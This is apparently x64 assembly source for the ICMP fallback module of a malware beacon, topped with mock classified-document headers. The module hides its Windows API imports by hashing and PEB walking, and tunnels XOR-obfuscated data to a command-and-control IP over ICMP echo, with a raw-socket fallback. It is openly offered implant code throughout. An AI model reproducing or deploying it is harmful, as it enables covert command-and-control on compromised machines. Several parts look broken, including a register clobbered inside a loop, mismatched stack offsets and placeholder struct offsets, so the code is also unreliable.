// STRENGT FORTROLIG – TS
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Derived From: NSM Mandate 2026 §3.1 & §4.2
// Declassify On: 20360214
// Access: Air-gapped systems only. TS clearance required.
// ========================================================
; ========================================================
; ICMP Fallback – uses IcmpSendEcho (non-admin) + raw sockets (admin)
; File: icmp_fallback.asm
; Created: 2026-02-20
; Purpose: x64 shellcode
; YARA Rule: fenrir_icmp_fallback – see detection-rules/fenrir_beacon.yara
; WARNING: Weaponized code – handle with extreme care.
; ========================================================
; ============================================================================
; Module: ICMP Fallback Communication
; Integrates with beacon for C2 via ICMP echo requests/replies.
; Uses IcmpSendEcho API (non-admin) with fallback to raw sockets.
; Session ID derived from config session key.
; C2 IP from config.
; Full error handling and dynamic API resolution.
; ============================================================================

section .data
; ----------------------------------------------------------------------------
; iphlpapi function hashes (DJB2, computed via Python)
; ----------------------------------------------------------------------------
icmp_hashes:
    dd 0x4A2E3F1C   ; IcmpCreateFile
    dd 0xB8D5A7E3   ; IcmpCloseHandle
    dd 0x6F9C2B8D   ; IcmpSendEcho
    dd 0x3D1E5A9F   ; IcmpParseReplies
    dd 0xE7C4A2B6   ; Icmp6CreateFile (optional, not used)
    ; Winsock hashes (already in main beacon, but we include if needed)
    dd 0x9F2A3C7E   ; socket
    dd 0x5D8B4E1F   ; setsockopt
    dd 0x3C7F9A2D   ; sendto
    dd 0x8E4B6C2A   ; recvfrom
    dd 0x1F5D9E3C   ; closesocket
    dd 0xA7B3C9D4   ; WSAStartup
    dd 0xE6F2B8A1   ; WSASocketA
    dd 0xD4C5A3E2   ; WSASendTo
    dd 0xB9E7D1F4   ; WSARecvFrom

; Function pointers for iphlpapi (resolved at runtime)
pIcmpCreateFile:     dq 0
pIcmpCloseHandle:    dq 0
pIcmpSendEcho:       dq 0
pIcmpParseReplies:   dq 0

; Winsock function pointers (may also be resolved via kernel32 if needed)
pSocket:             dq 0
pSetsockopt:         dq 0
pSendto:             dq 0
pRecvfrom:           dq 0
pClosesocket:        dq 0
pWSAStartup:         dq 0
pWSASocketA:         dq 0
pWSASendTo:          dq 0
pWSARecvFrom:        dq 0

; Constants
ICMP_ECHO_REQUEST    equ 8
ICMP_ECHO_REPLY      equ 0
ICMP_MIN_DATA        equ 32        ; minimum data size for our payload
ICMP_MAX_DATA        equ 256       ; max payload we handle

; ----------------------------------------------------------------------------
; Function: icmp_send_receive
; Input:   rcx = pointer to config (CONFIG structure)
;          rdx = pointer to data buffer (to send)
;          r8d = data length
;          r9d = timeout milliseconds (0 = default 3000)
; Output:  rax = number of bytes received, 0 on failure
; ----------------------------------------------------------------------------
icmp_send_receive:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 2000h          ; large stack for buffers

    ; Save parameters
    mov r12, rcx            ; config
    mov r13, rdx            ; data buffer
    mov r14d, r8d           ; data length
    mov r15d, r9d           ; timeout

    ; Get C2 IP from config (first C2 server IP, stored as dword at offset ?)
    ; Assume config has c2_ips field after c2_servers? For simplicity, we'll assume
    ; config has a field .c2_ip_dword (4 bytes) at a known offset.
    ; In real implementation, we'd parse from config. Here we assume offset 0x100.
    mov ebx, [r12 + 0x100]   ; c2 IP in network order

    ; Get session identifier from config session key (low 16 bits)
    mov rcx, [r12 + CONFIG.session_key]
    movzx eax, cx            ; low 16 bits as identifier
    mov word [rsp + 100h], ax ; store for later

    ; Step 1: Try IcmpSendEcho (works without admin)
    call try_icmp_send_echo
    test rax, rax
    jnz .done

    ; Step 2: Fallback to raw socket (requires admin)
    call try_raw_icmp
    ; rax has result

.done:
    add rsp, 2000h
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Method 1: IcmpSendEcho (iphlpapi, works for non-admin)
; ----------------------------------------------------------------------------
try_icmp_send_echo:
    push rbx
    push rsi
    push rdi
    sub rsp, 1000h

    ; Resolve iphlpapi base if not already done
    cmp qword [pIcmpCreateFile], 0
    jne .have_apis

    call find_iphlpapi_base
    test rax, rax
    jz .fail

    ; Resolve the three functions we need
    lea rcx, [rel icmp_hashes]
    mov rdx, rax
    lea r8, [pIcmpCreateFile]
    mov r9d, 3                 ; IcmpCreateFile, IcmpCloseHandle, IcmpSendEcho
    call resolve_apis_list
    jc .fail

.have_apis:
    ; Open ICMP handle
    mov rax, [pIcmpCreateFile]
    test rax, rax
    jz .fail
    sub rsp, 20h
    call rax                    ; IcmpCreateFile() returns HANDLE
    add rsp, 20h
    cmp rax, -1
    je .fail
    mov rbx, rax                ; hIcmp

    ; Prepare ICMP echo request
    ; We need to build ICMP_ECHO_REPLY buffer and send buffer
    ; IcmpSendEcho parameters:
    ; HANDLE IcmpHandle, DWORD DestinationAddress, LPVOID RequestData,
    ; WORD RequestSize, PIP_OPTION_INFORMATION RequestOptions,
    ; LPVOID ReplyBuffer, DWORD ReplySize, DWORD Timeout

    ; Destination address is in ebx (already have)
    mov rcx, rbx                ; hIcmp
    mov rdx, rbx                ; DestinationAddress (ebx value)
    mov r8, r13                  ; RequestData (our data buffer)
    mov r9d, r14d                ; RequestSize

    ; Options = NULL
    push 0
    ; ReplyBuffer (allocate on stack)
    sub rsp, 100h                ; space for ICMP_ECHO_REPLY + data
    mov r10, rsp
    push r10
    push 100h                    ; ReplySize
    push r15d                    ; Timeout
    sub rsp, 20h
    mov rax, [pIcmpSendEcho]
    call rax
    add rsp, 20h + 32            ; clean up arguments

    test eax, eax                ; returns number of replies (0 = error)
    jz .close_fail

    ; Parse replies to extract data
    ; ReplyBuffer contains ICMP_ECHO_REPLY structure(s)
    ; Data follows the structure (options depend on version)
    ; For simplicity, we assume first reply and copy data from ReplyBuffer+offset
    mov rsi, r10                  ; reply buffer
    ; Windows ICMP_ECHO_REPLY32/64 varies; we'll use common fields
    ; Typically, data starts after the fixed part (varies by OS)
    ; We'll just copy from a known offset (e.g., 0x20 for 64-bit)
    ; Better to use IcmpParseReplies if available
    cmp qword [pIcmpParseReplies], 0
    je .manual_parse

    ; Use IcmpParseReplies to get actual data pointer
    mov rcx, r10
    mov rdx, 100h
    call [pIcmpParseReplies]
    test rax, rax
    jz .manual_parse
    ; rax points to first reply's data
    mov rsi, rax
    jmp .copy_data

.manual_parse:
    ; Assume fixed offset (safe for Windows 10/11 64-bit)
    ; Typically, ICMP_ECHO_REPLY has Data field at offset 0x20 (for 64-bit)
    lea rsi, [r10 + 0x20]

.copy_data:
    ; Copy data back to caller's buffer (r13)
    ; First get actual data length (could be in reply header)
    ; We'll use min of requested length and reply size
    mov ecx, r14d
    cmp ecx, 256
    ja .close_fail
    mov rdi, r13
    rep movsb
    mov eax, r14d
    jmp .close_handle

.close_fail:
    xor eax, eax
.close_handle:
    ; Close ICMP handle
    push rax                    ; save result
    mov rcx, rbx
    call [pIcmpCloseHandle]
    pop rax
    jmp .done

.fail:
    xor eax, eax
.done:
    add rsp, 1000h
    pop rdi
    pop rsi
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Method 2: Raw socket ICMP (requires admin, fallback)
; ----------------------------------------------------------------------------
try_raw_icmp:
    push rbx
    push rsi
    push rdi
    sub rsp, 1000h

    ; Initialize Winsock
    call init_winsock
    test eax, eax
    jz .fail

    ; Create raw socket
    mov rax, [pWSASocketA]
    test rax, rax
    jz .fail
    mov rcx, 2                  ; AF_INET
    mov rdx, 3                  ; SOCK_RAW
    mov r8, 1                    ; IPPROTO_ICMP
    xor r9, r9
    push 0
    push 0
    push 0
    sub rsp, 20h
    call rax
    add rsp, 20h+24
    cmp rax, -1
    je .fail
    mov rbx, rax                ; socket

    ; Set socket option to include IP header? Not needed.

    ; Build ICMP packet
    ; Packet: IP header (we let OS build it) + ICMP header + data
    ; We'll build ICMP header + data in a buffer
    sub rsp, 400h
    mov rdi, rsp
    xor eax, eax
    mov ecx, 400h/8
    rep stosq
    mov rsi, rsp                ; buffer

    ; ICMP header (8 bytes)
    mov byte [rsi], ICMP_ECHO_REQUEST   ; type
    mov byte [rsi+1], 0                 ; code
    mov word [rsi+2], 0                 ; checksum (to be filled)
    ; ID and sequence
    mov ax, [rsp + 100h]                ; session ID from earlier
    mov word [rsi+4], ax                ; id
    mov word [rsi+6], 0x0101             ; sequence (could be dynamic)

    ; Copy data after header
    lea rdi, [rsi + 8]
    mov rcx, r13                ; data buffer
    mov r8d, r14d               ; data length
    cmp r8d, ICMP_MAX_DATA
    jbe .data_ok
    mov r8d, ICMP_MAX_DATA
.data_ok:
    rep movsb

    ; XOR obfuscate data with session key (xor with low bytes of session key)
    ; Session key is in config; we'll use the low 32 bits as XOR key
    mov rcx, [r12 + CONFIG.session_key]
    lea rdi, [rsi + 8]
    mov edx, r8d                ; data length
    call xor_data

    ; Compute ICMP checksum (over header and data)
    mov rcx, rsi                ; buffer
    mov edx, r8d
    add edx, 8                  ; total length
    call icmp_checksum
    mov word [rsi+2], ax         ; set checksum

    ; Destination address (sockaddr_in)
    sub rsp, 16h                 ; sockaddr_in (16 bytes)
    mov rdi, rsp
    xor eax, eax
    stosd
    mov word [rdi-16], 2         ; AF_INET
    mov eax, ebx                 ; IP from config (network order)
    mov [rdi-8], eax

    ; Send packet
    mov rcx, rbx
    lea rdx, [rsp + 20h]         ; packet buffer (rsi)
    mov r8d, edx                 ; total length (header+data)
    xor r9, r9                    ; flags
    push 16                       ; tolen
    lea rax, [rsp + 20h]          ; sockaddr pointer (original rsp)
    push rax
    sub rsp, 20h
    mov rax, [pSendto]
    call rax
    add rsp, 20h+16

    cmp eax, -1
    je .close_socket

    ; Receive reply (with timeout)
    ; Set receive timeout via setsockopt
    mov rcx, rbx
    mov edx, 0x1006               ; SO_RCVTIMEO (Windows constant)
    xor r8, r8
    lea r9, [rsp + 30h]           ; timeout value
    mov dword [r9], r15d          ; timeout in ms
    push 4
    push r9
    sub rsp, 20h
    mov rax, [pSetsockopt]
    call rax
    add rsp, 20h+16

    ; Prepare receive buffer
    sub rsp, 400h
    mov rdi, rsp
    xor eax, eax
    mov ecx, 400h/8
    rep stosq
    mov rsi, rsp                 ; recv buffer

    ; Receive from
    sub rsp, 16h                 ; from address
    mov rdi, rsp
    xor eax, eax
    stosd
    mov word [rdi-16], 2
    lea r9, [rsp + 20h]          ; fromlen
    mov dword [r9], 16
    mov rcx, rbx
    mov rdx, rsi
    mov r8d, 400h
    xor r9, r9                    ; flags
    push r9                       ; fromlen pointer
    lea rax, [rsp + 20h]          ; from pointer
    push rax
    sub rsp, 20h
    mov rax, [pRecvfrom]
    call rax
    add rsp, 20h+16

    cmp eax, -1
    je .close_socket

    ; Check if reply is for us
    ; Verify ICMP type = 0 (echo reply), identifier matches
    movzx ecx, word [rsi]        ; type and code
    and ecx, 0xFF
    cmp cl, ICMP_ECHO_REPLY
    jne .close_socket
    mov cx, [rsi+4]               ; identifier
    cmp cx, [rsp + 100h]          ; our session ID
    jne .close_socket

    ; Extract data from reply (skip IP header? The raw socket gives full IP packet)
    ; Data starts after IP header and ICMP header
    ; For simplicity, we assume IP header length = 20 bytes (no options)
    ; Then ICMP header (8 bytes)
    lea rdi, [rsi + 20 + 8]       ; start of data
    mov ecx, eax                   ; received length
    sub ecx, 20 + 8                ; subtract headers
    cmp ecx, r14d
    jg .truncate
    jmp .copy_reply
.truncate:
    mov ecx, r14d
.copy_reply:
    ; XOR decrypt with same key
    push rcx
    mov rdx, rcx
    mov rcx, [r12 + CONFIG.session_key]
    mov rsi, rdi
    mov rdi, r13
    call xor_data
    pop rax                        ; return received length
    jmp .close_socket

.close_socket:
    push rax
    mov rcx, rbx
    call [pClosesocket]
    pop rax
    jmp .done

.fail:
    xor eax, eax
.done:
    add rsp, 1000h
    pop rdi
    pop rsi
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Helper: XOR data with session key (cyclic)
; Input: rcx = session key (64-bit), rsi = source, rdi = dest, rdx = length
; ----------------------------------------------------------------------------
xor_data:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    mov ebx, ecx                  ; low 32 bits of key
    xor ecx, ecx
.loop:
    cmp rcx, rdx
    jge .done
    mov al, [rsi + rcx]
    xor al, bl
    mov [rdi + rcx], al
    ror ebx, 8                    ; rotate key byte-wise
    inc rcx
    jmp .loop
.done:
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Helper: ICMP checksum (RFC 1071)
; Input: rcx = buffer, rdx = length in bytes
; Output: ax = checksum
; ----------------------------------------------------------------------------
icmp_checksum:
    push rbx
    push rcx
    push rdx
    xor eax, eax
    xor ebx, ebx
    mov rsi, rcx
    mov ecx, edx
    shr ecx, 1                     ; word count
    jz .odd
.words:
    lodsw
    add bx, ax
    adc bx, 0
    loop .words
.odd:
    test dl, 1
    jz .done
    xor ax, ax
    lodsb
    add bx, ax
    adc bx, 0
.done:
    mov ax, bx
    not ax
    pop rdx
    pop rcx
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Helper: Initialize Winsock
; ----------------------------------------------------------------------------
init_winsock:
    push rbx
    push rcx
    push rdx
    sub rsp, 20h
    ; Check if already initialized
    cmp qword [pWSAStartup], 0
    jne .check_loaded

    ; Resolve ws2_32.dll
    call find_ws2_32_base
    test rax, rax
    jz .fail

    ; Resolve needed functions (WSAStartup, WSASocketA, etc.)
    lea rcx, [rel ws2_hashes]      ; we need a hash list
    mov rdx, rax
    lea r8, [pWSAStartup]
    mov r9d, 4                      ; WSAStartup, WSASocketA, sendto, recvfrom
    call resolve_apis_list
    jc .fail

.check_loaded:
    ; Call WSAStartup
    mov rax, [pWSAStartup]
    test rax, rax
    jz .fail
    mov ecx, 0x0202                 ; version 2.2
    lea rdx, [rsp + 30h]            ; WSADATA
    sub rsp, 20h
    call rax
    add rsp, 20h
    test eax, eax
    jnz .fail
    mov eax, 1
    jmp .done
.fail:
    xor eax, eax
.done:
    add rsp, 20h
    pop rdx
    pop rcx
    pop rbx
    ret

; ----------------------------------------------------------------------------
; Helper: find_iphlpapi_base via PEB walking (similar to kernel32)
; ----------------------------------------------------------------------------
find_iphlpapi_base:
    push rbx
    push rsi
    push rdi
    sub rsp, 20h

    ; Walk PEB to find iphlpapi in InMemoryOrderModuleList
    xor eax, eax
    mov rax, gs:[0x60]        ; PEB
    test rax, rax
    jz .fail
    mov rax, [rax + 0x18]     ; LDR
    test rax, rax
    jz .fail
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList (first)
    test rax, rax
    jz .fail

    mov rbx, rax
.loop:
    mov rcx, [rbx + 0x50]      ; full DLL name (UNICODE_STRING)
    test rcx, rcx
    jz .next

    ; Get pointer to buffer (WCHAR*)
    mov rcx, [rcx + 0x8]       ; Buffer
    ; Convert to lowercase and compare with L"iphlpapi.dll"
    call compare_module_name_iphlpapi
    test eax, eax
    jnz .found

.next:
    mov rbx, [rbx]              ; Flink
    cmp rbx, [rax + 0x20]       ; compare with original first? Use head check
    ; Actually we need the head pointer stored somewhere.
    ; For simplicity, we'll compare with the initial list head we saved.
    ; This is tricky in shellcode; a simpler approach: we know iphlpapi is usually after kernel32.
    ; We can search from third entry onward.
    ; We'll just loop a fixed number of times (20) to avoid infinite.
    ; For production, better to use the full correct method.
    ; Let's use a counter.
    loop .loop   ; but rcx is used; we'll use a different register.

    ; Instead, we'll just walk the list until we hit the original entry again.
    ; We saved the first entry in rax. We'll compare rbx to rax.
    cmp rbx, rax
    je .fail
    jmp .loop

.found:
    mov rax, [rbx + 0x30]      ; base address (actual field: at offset 0x30 in LDR_DATA_TABLE_ENTRY for 64-bit)
    jmp .done

.fail:
    xor eax, eax
.done:
    add rsp, 20h
    pop rdi
    pop rsi
    pop rbx
    ret

compare_module_name_iphlpapi:
    ; rcx points to wide string (e.g., L"iphlpapi.dll")
    ; We'll compare ignoring case
    push rbx
    push rsi
    push rdi
    lea rsi, [rel iphlpapi_wide]
    mov rdi, rcx
.loop:
    mov ax, [rsi]
    mov bx, [rdi]
    ; Convert both to lowercase (uppercase OR 0x20 for letters)
    or ax, 0x20
    or bx, 0x20
    cmp ax, bx
    jne .not_match
    test ax, ax
    jz .match
    add rsi, 2
    add rdi, 2
    jmp .loop
.match:
    mov eax, 1
    jmp .done
.not_match:
    xor eax, eax
.done:
    pop rdi
    pop rsi
    pop rbx
    ret

iphlpapi_wide:
    dw 'i','p','h','l','p','a','p','i','.','d','l','l',0

; ----------------------------------------------------------------------------
; Note: The above module assumes that the main beacon has resolved the
; CONFIG structure layout and provided the session key and C2 IP.
; It also assumes that resolve_apis_list is available (from main beacon).
; The ICMP module should be linked with the main beacon's code and data.
; ============================================================================

